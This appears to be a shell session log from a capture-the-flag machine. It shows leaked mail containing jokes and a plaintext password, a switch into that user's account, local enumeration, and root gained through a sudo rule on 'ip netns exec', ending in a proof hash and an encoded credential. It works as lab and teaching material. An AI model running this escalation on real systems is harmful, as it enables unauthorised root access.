+From admin@mofo.pwn Tue Aug 13 13:00:56 2019
+Return-path: <admin@mofo.pwn>
+Envelope-to: someuser@localhost
+Delivery-date: Tue, 13 Aug 2019 13:00:56 +0200
+Received: from root by nancy.mofo.pwn with local (Exim 4.92)
+        (envelope-from <admin@mofo.pwn>)
+        id 1hxUXw-0001rj-Va
+        for someuser@localhost; Tue, 13 Aug 2019 13:00:56 +0200
+Subject: God vs. satan
+From: admin@mofo.pwn
+To: <someuser@localhost>
+X-Mailer: mail (GNU Mailutils 3.5)
+Message-Id: <E1hxUXw-0001rj-Va@nancy.mofo.pwn>
+Date: Tue, 13 Aug 2019 13:00:56 +0200
+Status: O
+X-UID: 217
+
+ God finally decided to take Satan to court, to settle their differences
+once and for all.
+
+ Upon hearing this, Satan laughed, and said, "Where do you think you're
+going to find a lawyer?"
+From admin@mofo.pwn Tue Aug 13 13:00:57 2019
+Return-path: <admin@mofo.pwn>
+Envelope-to: someuser@localhost
+Delivery-date: Tue, 13 Aug 2019 13:00:57 +0200
+Received: from root by nancy.mofo.pwn with local (Exim 4.92)
+        (envelope-from <admin@mofo.pwn>)
+        id 1hxUXx-0001rn-01
+        for someuser@localhost; Tue, 13 Aug 2019 13:00:57 +0200
+Subject: Phrases of education
+From: admin@mofo.pwn
+To: <someuser@localhost>
+X-Mailer: mail (GNU Mailutils 3.5)
+Message-Id: <E1hxUXx-0001rn-01@nancy.mofo.pwn>
+Date: Tue, 13 Aug 2019 13:00:57 +0200
+Status: O
+X-UID: 218
+
+From: tegrara@prism.gatech.edu (ramasamy alagirussmy)
+Newsgroups: rec.humor.funny
+Subject: Phases of education
+Date: 5 Apr 90 10:30:08 GMT
+
+
+The dean of Engineering had once walked into a class, and said               
+"Good Morning." The whole class chorused "Good Morning".
+
+"Hi, you are freshmen aren't you?" he asked.
+
+One student bolder than the others asked him how he knew.
+
+"Well," he said. "When I say 'Good Morning' to a class, if they are
+freshmen they say 'Good Morning' too. If they are sophomores, they
+quietly fold their papers away, and look at me. A class of Juniors 
+will look at me over the top of their papers, and then get back to
+them. A class of Seniors will ignore my greeting, and keep reading
+the papers. When I say 'Good Morning' to a class of graduate students,
+they write it down.
+
+{ed There are lots of quote collections out there.  I prefer not to do 'em,
+because they are so big and varied, but I had this one lying around...}
+From fritz@csvax.caltech.edu Tue Aug 13 13:00:57 2019
+Return-path: <admin@mofo.pwn>
+Envelope-to: someuser@localhost
+Delivery-date: Tue, 13 Aug 2019 13:00:57 +0200
+Received: from root by nancy.mofo.pwn with local (Exim 4.92)
+        (envelope-from <admin@mofo.pwn>)
+        id 1hxUXx-0001rr-0m
+        for someuser@localhost; Tue, 13 Aug 2019 13:00:57 +0200
+Subject: Practical jokes
+From: fritz@csvax.caltech.edu
+To: <someuser@localhost>
+X-Mailer: mail (GNU Mailutils 3.5)
+Message-Id: <E1hxUXx-0001rr-0m@nancy.mofo.pwn>
+Date: Tue, 13 Aug 2019 13:00:57 +0200
+Status: O
+X-UID: 219
+
+From: fritz@csvax.caltech.edu.UUCP (fritz nordby)
+Subject: human oscillators
+Date: 29 Jun 88 21:45:27 GMT
+
+
+My favourite two campus practical jokes:
+
+1. Arrange the light switches in a lavatory and an adjacent room so that
+flipping one switch also flips the other.  Consider the resultant scene
+(visible from the outside just by watching the windows): the room's resident
+retires for the evening, turning off his (or her) light.  Some time later,
+someone else decides to use the head, and turns on the light.  After a few
+minutes, the resident awakes, decides that someone is pulling a fast one,
+and turns the light off ... on the guy (or girl) who is by now seated on
+the throne!  If it works correctly, the two unfortunates end up standing
+at their respective light switches, with the lights oscillating rapidly
+(by which time the perpetrators are rolling on the ground outside laughing
+their heads off).
+
+2. This prank happened a number of years ago.  Two guys had been pulling
+practical jokes on each other for quite a while.  Finally, one of them got
+a pair of rather large (and LOUD) firecrackers, and wired them to light
+bulb bases with nichrome wire such that applying power would set off the
+firecrackers.  One of the devices was installed in the victim's room, the
+other in the perpetrator's.
+
+That evening, the victim returned to his room, and turned on the light.
+There was a short delay as the fuse burned, and during that delay the victim
+(quite naturally) turned to see what was wrong with the light -- BLAM!  Well,
+the victim was (quite naturally) upset and flustered and resolved to do some-
+thing appropriately horrendous to the perpetrator's room.  He went over to
+the perpetrator's room, his own counter-prank in hand, went in, and turned
+on the light.  When nothing happened, his reflexes again betrayed him: he
+looked up at the light -- BLAM!
+
+Apparently, the victim never bothered to counter-stack the perpetrator.
+
+BTW.
+You will need my username and password when you step in for me next week
+genowefa:9e4lw0r82eq5
+
+
+From admin@mofo.pwn Tue Aug 13 13:00:57 2019
+Return-path: <admin@mofo.pwn>
+Envelope-to: someuser@localhost
+Delivery-date: Tue, 13 Aug 2019 13:00:57 +0200
+Received: from root by nancy.mofo.pwn with local (Exim 4.92)
+        (envelope-from <admin@mofo.pwn>)
+        id 1hxUXx-0001rv-1P
+        for someuser@localhost; Tue, 13 Aug 2019 13:00:57 +0200
+Subject: Remember..
+From: admin@mofo.pwn
+To: <someuser@localhost>
+X-Mailer: mail (GNU Mailutils 3.5)
+Message-Id: <E1hxUXx-0001rv-1P@nancy.mofo.pwn>
+Date: Tue, 13 Aug 2019 13:00:57 +0200
+Status: O
+X-UID: 220
+
+Hi
+
+This is very important!
+Remember to... idk... something.. I forgot...
+
+
+Kind regards
+Me
+sebestian@nancy:/var/mail$ su genna
+su genna
+su: user genna does not exist
+sebestian@nancy:/var/mail$ su genowefa
+su genowefa
+Password: 9e4lw0r82eq5
+
+genowefa@nancy:/var/mail$ sudo -l
+sudo -l
+Matching Defaults entries for genowefa on nancy:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User genowefa may run the following commands on nancy:
+    (ALL) NOPASSWD: /usr/sbin/ip
+genowefa@nancy:/var/mail$ sudo ip /bin/sh
+sudo ip /bin/sh
+Object "/bin/sh" is unknown, try "ip help".
+genowefa@nancy:/var/mail$ cd /home
+cd /home
+genowefa@nancy:/home$ ls
+ls
+amir  constance  elayne   genowefa  leonelle  maidisn  natassja  sebestian
+chi   eachelle   freddie  genvieve  lorrel    malik    regine
+genowefa@nancy:/home$ ls -la
+ls -la
+total 68
+drwxr-xr-x 17 root      root      4096 Dec 28 22:23 .
+drwxr-xr-x 18 root      root      4096 Aug 14  2019 ..
+drwxr-x---  3 amir      amir      4096 Dec 28 22:23 amir
+drwxr-x---  3 chi       chi       4096 Dec 28 22:23 chi
+drwxr-x---  3 constance constance 4096 Dec 28 22:23 constance
+drwxr-x---  3 eachelle  eachelle  4096 Dec 28 22:23 eachelle
+drwxr-x---  3 elayne    elayne    4096 Dec 28 22:23 elayne
+drwxr-x---  3 freddie   freddie   4096 Dec 28 22:23 freddie
+drwxr-x---  3 genowefa  genowefa  4096 Dec 28 22:23 genowefa
+drwxr-x---  3 genvieve  genvieve  4096 Dec 28 22:23 genvieve
+drwxr-x---  3 leonelle  leonelle  4096 Dec 28 22:23 leonelle
+drwxr-x---  3 lorrel    lorrel    4096 Dec 28 22:23 lorrel
+drwxr-x---  3 maidisn   maidisn   4096 Dec 28 22:23 maidisn
+drwxr-x---  3 malik     malik     4096 Dec 28 22:23 malik
+drwxr-x---  3 natassja  natassja  4096 Dec 28 22:23 natassja
+drwxr-x---  3 regine    regine    4096 Dec 28 22:23 regine
+drwxr-x---  4 sebestian sebestian 4096 Dec 30 05:21 sebestian
+genowefa@nancy:/home$ find / -perm -u=s -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+/usr/bin/umount
+/usr/bin/chfn
+/usr/bin/mount
+/usr/bin/gpasswd
+/usr/bin/su
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/sudo
+/usr/bin/fusermount
+/usr/bin/chsh
+/usr/bin/pkexec
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/sbin/exim4
+genowefa@nancy:/home$ sudo /bin/bash
+sudo /bin/bash
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for genowefa: 9e4lw0r82eq5
+
+Sorry, user genowefa is not allowed to execute '/bin/bash' as root on nancy.mofo.pwn.
+genowefa@nancy:/home$ sudo ip route exec /bin/bash
+sudo ip route exec /bin/bash
+Command "exec" is unknown, try "ip route help".
+genowefa@nancy:/home$ /usr/sbin/ip
+/usr/sbin/ip
+Usage: ip [ OPTIONS ] OBJECT { COMMAND | help }
+       ip [ -force ] -batch filename
+where  OBJECT := { link | address | addrlabel | route | rule | neigh | ntable |
+                   tunnel | tuntap | maddress | mroute | mrule | monitor | xfrm |
+                   netns | l2tp | fou | macsec | tcp_metrics | token | netconf | ila |
+                   vrf | sr }
+       OPTIONS := { -V[ersion] | -s[tatistics] | -d[etails] | -r[esolve] |
+                    -h[uman-readable] | -iec | -j[son] | -p[retty] |
+                    -f[amily] { inet | inet6 | ipx | dnet | mpls | bridge | link } |
+                    -4 | -6 | -I | -D | -M | -B | -0 |
+                    -l[oops] { maximum-addr-flush-attempts } | -br[ief] |
+                    -o[neline] | -t[imestamp] | -ts[hort] | -b[atch] [filename] |
+                    -rc[vbuf] [size] | -n[etns] name | -a[ll] | -c[olor]}
+genowefa@nancy:/home$ sudo ip netns exec foo /bin/sh
+sudo ip netns exec foo /bin/sh
+Cannot open network namespace "foo": No such file or directory
+genowefa@nancy:/home$ id
+id
+uid=1010(genowefa) gid=1010(genowefa) groups=1010(genowefa)
+genowefa@nancy:/home$ sudo ip netns add foo
+sudo ip netns add foo
+genowefa@nancy:/home$ sudo ip netns exec foo /bin/sh
+sudo ip netns exec foo /bin/sh
+# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+# cd /root
+cd /root
+# ls
+ls
+proof.sh  scripts
+# cat proof.sh
+cat proof.sh
+#!/bin/bash
+clear
+figlet nice work!
+echo Tempus Fugit pwned...
+echo __________________________________________________________________________
+echo
+echo Proof: 305c941fe2d57c4063d256477df70ff1
+echo Path: $(pwd)
+echo Date: $(date)
+echo Whoami: $(whoami)
+echo __________________________________________________________________________
+echo
+fortune -s
+echo
+# cat scripts
+cat scripts
+cat: scripts: Is a directory
+# cd scripts
+cd scripts
+# ls
+ls
+chpass.sh  httpreq.sh  privuser.txt  rock.txt
+# cat privuser.txt
+cat privuser.txt
+c2ViZXN0aWFuOmxha2Vycwo=
+# 
